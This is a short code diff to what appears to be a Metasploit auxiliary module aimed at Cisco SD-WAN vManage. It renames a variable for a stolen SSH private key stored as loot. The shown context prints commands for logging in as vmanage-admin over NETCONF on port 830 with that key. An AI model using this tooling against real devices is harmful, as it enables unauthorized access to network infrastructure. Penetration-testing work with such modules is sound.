@@ -262,8 +262,8 @@ class MetasploitModule < Msf::Auxiliary
       # If we are using an existing key supplied by the user, just show how to connect to the NETCONF service.
       print_good("Use: ssh -i <SSH_PRIVATE_KEY_FILE> vmanage-admin@#{rhost} -p 830") unless silent
     else
-      # Write SSH key files to loot directory
-      loot_path = store_loot(
+      # Write SSH key file to loot
+      privkey_path = store_loot(
         'cisco.sdwan.sshkey',
         'application/x-pem-file',
         rhost,
@@ -273,11 +273,11 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       unless silent
-        print_status("SSH private key saved to loot: #{loot_path}")
+        print_status("SSH private key saved to loot: #{privkey_path}")
         # Provide connection instructions
         print_good('Connect to NETCONF via:')
-        print_line("chmod 600 #{loot_path}")
-        print_line("ssh -i #{loot_path} vmanage-admin@#{rhost} -p 830")
+        print_line("chmod 600 #{privkey_path}")
+        print_line("ssh -i #{privkey_path} vmanage-admin@#{rhost} -p 830")
       end
     end
 
